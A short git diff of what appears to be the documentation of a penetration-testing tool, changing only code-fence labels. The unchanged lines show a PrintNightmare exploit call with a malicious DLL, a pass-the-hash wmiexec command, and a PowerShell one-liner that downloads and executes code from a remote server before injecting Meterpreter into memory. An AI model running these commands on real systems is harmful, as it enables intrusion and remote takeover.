@@ -210,7 +210,7 @@ Some exploits require a DLL, so the idea is that you mount the  WebDAV
 drive, put malicious DLLs in the read-only directory, and then load them
 like this:
 
-```powershell
+```ps1con
 PS C:\> Import-Module .\cve-2021-1675.ps1
 PS C:\> Invoke-Nightmare -DLL "R:\evil-exploit-code.dll"
 ```
@@ -299,7 +299,7 @@ $ wmiexec.py -hashes :deadbeef0000000000000000deadbeef \
 
 Let's say you want to execute a Meterpreter in memory, then you do this after placing `meterpreter.exe` in `$XDG_DATA_HOME/powerhub/modules/exe` (don't forget to reload the modules!):
 
-```powershell
+```ps1con
 PS C:\Users\pentestuser> $K=new-object net.webclient;IEX $K.downloadstring("http://10.0.100.13:8000/0");
 PS C:\Users\pentestuser> ghm ReflectivePEInjection; ghm meterpreter.exe|re
 ```
